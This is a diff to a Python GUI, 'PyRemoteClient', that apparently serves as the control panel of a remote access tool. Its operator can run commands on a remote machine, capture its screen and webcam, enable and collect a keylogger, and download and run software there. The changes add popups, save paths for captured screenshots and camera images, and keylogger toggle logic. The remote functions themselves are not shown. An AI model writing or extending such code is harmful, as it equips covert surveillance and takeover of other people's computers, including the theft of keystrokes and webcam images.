@@ -1,3 +1,4 @@
+import threading
 import tkinter
 import customtkinter
 from typing import Callable
@@ -6,10 +7,81 @@ import io
 import time
 import os
 
+MAINFOLDER = "PyRemoteClient/"
+
 customtkinter.set_appearance_mode("dark")  # Modes: system (default), light, dark
 customtkinter.set_default_color_theme("blue")  # Themes: blue (default), dark-blue, green
 
 layouts = []
+
+
+# Global Functions
+def Invoke(func: Callable, delay: float):
+    start = threading.Timer(delay, func)
+    start.start()
+
+
+# Popups Windows
+class Popups:
+    """A class that provides a syntactic wrapper for related static methods"""
+    @staticmethod
+    def savedLogs(root: customtkinter.CTk, saveDirectory:str = "PyRemoteClient/logs", geometry: str ="450x200"):
+        def closeWindow():
+            window.destroy()
+            window.update()
+
+        Invoke(closeWindow, 3)
+
+        window: customtkinter.CTkToplevel = customtkinter.CTkToplevel(root)
+        #window.geometry(geometry)
+        window.title("Log(s) saved!")
+        window.resizable(False, False)
+
+        title = customtkinter.CTkLabel(window, text=f"File(s) Saved to: {saveDirectory}", font=customtkinter.CTkFont(size=20, weight="bold"))
+        title.grid(row=0, column=0, padx=20, pady=10)
+
+        quitButton = customtkinter.CTkButton(window, text="Exit", command=closeWindow)
+        quitButton.grid(row=1, column=0, padx=20, pady=10)
+
+    #### Could possibly combine all these popups, at least the ones with repeating code ####
+
+    @staticmethod
+    def successfullyDownloaded(root: customtkinter.CTk, filename: str):
+        def closeWindow():
+            window.destroy()
+            window.update()
+
+        Invoke(closeWindow, 3)
+
+        window: customtkinter.CTkToplevel = customtkinter.CTkToplevel(root)
+        #window.geometry(geometry)
+        window.title("Log(s) saved!")
+        window.resizable(False, False)
+
+        title = customtkinter.CTkLabel(window, text=f"File Saved to: {filename}", font=customtkinter.CTkFont(size=20, weight="bold"))
+        title.grid(row=0, column=0, padx=20, pady=10)
+
+        quitButton = customtkinter.CTkButton(window, text="Exit", command=closeWindow)
+        quitButton.grid(row=1, column=0, padx=20, pady=10)
+
+    @staticmethod
+    def successfullyDeployed(root: customtkinter.CTk):
+        def closeWindow():
+            window.destroy()
+            window.update()
+
+        Invoke(closeWindow, 3)
+
+        window: customtkinter.CTkToplevel = customtkinter.CTkToplevel(root)
+        #window.geometry(geometry)
+        window.title("Log(s) saved!")
+        window.resizable(False, False)
+
+        title = customtkinter.CTkLabel(window, text="Deployed!", font=customtkinter.CTkFont(size=20, weight="bold"))
+        title.grid(row=0, column=0, padx=20, pady=10)
+
+        quitButton = customtkinter.CTkButton(window, text="Exit", command=closeWindow)
+        quitButton.grid(row=1, column=0, padx=20, pady=10)
 
 
 # Custom CTk Frames
@@ -51,9 +123,9 @@ class screenshotFrame(Frame):
     def __init__(self, *args, ontakeScreenshot: Callable, **kwargs):
         super().__init__(*args, **kwargs)
         self.configure(fg_color="transparent")
-        self.screenshot = customtkinter.CTkImage(light_image=Image.open("images/placeholder.png"),
-                                          dark_image=Image.open("images/placeholder.png"),
-                                          size=(400, 200))
+        self.screenshot = customtkinter.CTkImage(light_image=Image.open("PyRemoteClient/images/placeholder.png"),
+                                                 dark_image=Image.open("PyRemoteClient/images/placeholder.png"),
+                                                 size=(400, 200))
         self.screenshotContainerLabel = customtkinter.CTkLabel(self, image=self.screenshot, text="")
         self.screenshotContainerLabel.grid(row=0, column=0)
 
@@ -65,9 +137,9 @@ class cameraFrame(Frame):
     def __init__(self, *args, onCapture: Callable, **kwargs):
         super().__init__(*args, **kwargs)
         self.configure(fg_color="transparent")
-        self.capture = customtkinter.CTkImage(light_image=Image.open("images/placeholder.png"),
-                                          dark_image=Image.open("images/placeholder.png"),
-                                          size=(400, 200))
+        self.capture = customtkinter.CTkImage(light_image=Image.open("PyRemoteClient/images/placeholder.png"),
+                                              dark_image=Image.open("PyRemoteClient/images/placeholder.png"),
+                                              size=(400, 200))
         self.captureContainerLabel = customtkinter.CTkLabel(self, image=self.capture, text="")
         self.captureContainerLabel.grid(row=0, column=0)
 
@@ -157,7 +229,7 @@ class App(customtkinter.CTk):
         self.ssFrame = screenshotFrame(self, ontakeScreenshot=self.takeScreenshot)
         # self.ssFrame.grid(row=0, column=1, padx=20, pady=20)
         self.cameraCaptureFrame = cameraFrame(self, onCapture=self.takeCapture)
-        self.adminFrame = keyloggerFrame(self, keyloggerFunc=self.deploySoftwareWrapper, getoutput=self.getKeyloggerOutputWrapper)
+        self.adminFrame = keyloggerFrame(self, keyloggerFunc=self.keyloggerDeployWrapper, getoutput=self.getKeyloggerOutputWrapper)
         self.downloaderFrame = softwareDownloaderFrame(self, downloadSoftware=self.downloadSoftwareWrapper, deploySoftware=self.deploySoftwareWrapper)
 
 
@@ -167,6 +239,7 @@ class App(customtkinter.CTk):
         print(self.mainFrame.commandEntry.get())
         output = self.client.command(cmd=self.mainFrame.commandEntry.get())
         self.mainFrame.outputBox.configure(state="normal")
+        self.mainFrame.outputBox.delete('1.0', customtkinter.END)
         self.mainFrame.outputBox.insert("0.0", output)
 
     def switchLayoutCommand(self) -> None:
@@ -187,16 +260,15 @@ class App(customtkinter.CTk):
         for layout in layouts:
             layout.grid_forget()
 
-    # Placeholder funcs
     def takeScreenshot(self):
         self.client.screenshot()
         bytesScreenshot = self.client.screenshot()
         pilscreenshot: Image = Image.open(io.BytesIO(bytesScreenshot))
         try:
-            os.mkdir("Screenshots")
+            os.mkdir(f"{MAINFOLDER}Screenshots")
         except FileExistsError:
             print()
-        pilscreenshot.save(f"Screenshots/{time.strftime('%d-%m-%Y')}.png")
+        pilscreenshot.save(f"{MAINFOLDER}Screenshots/{time.strftime('%d-%m-%Y')}.png")
         pilscreenshot = pilscreenshot.resize((400, 200))
         self.ssFrame.screenshot.configure(dark_image=pilscreenshot, light_image=pilscreenshot)
 
@@ -205,24 +277,31 @@ class App(customtkinter.CTk):
         bytesCapture = self.client.capture()
         pilCapture = Image.open(io.BytesIO(bytesCapture))
         try:
-            os.mkdir("Captures")
+            os.mkdir(f"{MAINFOLDER}Captures")
         except FileExistsError:
             print()
-        pilCapture.save(f"Captures/{time.strftime('%d-%m-%Y')}.png")
+        pilCapture.save(f"{MAINFOLDER}Captures/{time.strftime('%d-%m-%Y')}.png")
         pilCapture = pilCapture.resize((400, 200))
         self.cameraCaptureFrame.capture.configure(dark_image=pilCapture, light_image=pilCapture)
 
     """ Wrapper functions for admin tools to allow passthrough of arguements """
     def keyloggerDeployWrapper(self):
-        self.client.deployKeylogger()
+        status = self.client.deployKeylogger()
+        if status == "True":
+            self.adminFrame.keyloggerToggle.configure(text="Disable Keylogger")
+        else:
+            self.adminFrame.keyloggerToggle.configure(text="Enable Keylogger")
 
-    def getKeyloggerOutputWrapper(self) -> str:
+    def getKeyloggerOutputWrapper(self) -> None:
+        Popups.savedLogs(self)
         return self.client.getKeyloggerOutput()
 
     def downloadSoftwareWrapper(self):
-        self.client.downloadSoftware(self.downloaderFrame.url.get())
+        filename = self.client.downloadSoftware(self.downloaderFrame.url.get())
+        Popups.successfullyDownloaded(self, filename)
 
     def deploySoftwareWrapper(self):
+        Popups.successfullyDeployed(self)
         self.client.deploySoftware(self.downloaderFrame.runargs.get())
 
     """ END WRAPPERS"""
